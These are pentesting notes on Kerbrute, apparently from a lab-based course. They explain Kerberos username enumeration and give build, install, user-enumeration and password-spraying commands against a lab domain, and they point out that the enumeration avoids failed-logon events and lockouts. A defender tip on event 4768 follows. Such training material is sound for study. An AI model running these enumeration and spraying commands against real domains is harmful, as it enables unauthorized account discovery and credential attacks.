---
title: Kerbrute
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - enumeration
  - active directory
---
# Kerbrute

 It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts.
 This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for.

**How it works?**

Basically, the tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid.

*This method of username enumeration does not cause logon failures and will not lock out accounts.*


```
sudo git clone https://github.com/ropnop/kerbrute.git

# Typing make help will show us the compiling options available.
cd kerbrute
make help

# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).
sudo make all

# The newly created dist directory will contain our compiled binaries.
ls -la dist
```


```
#############
# FOR LINUX
#############

# Add the tool to our PATH to make it accessible from anywhere in the host. For that we make sure first of the PATH
echo $PATH

# and then we move the binary to a path, for instance
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute



#############
# FOR WINDOWS
#############
# Copy the file to the windows pivoting machine
scp kerbrute_windows_amd64.exe username@$ip:~/

```


## Basic commands

```
# User enumeration 
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
# -d: domain
# --dc: domain controller
# -o: output file

# Password spraying attack with kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1


```

**However**, using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768).  Defenders can tune their SIEM tools to look for an influx of this event ID.

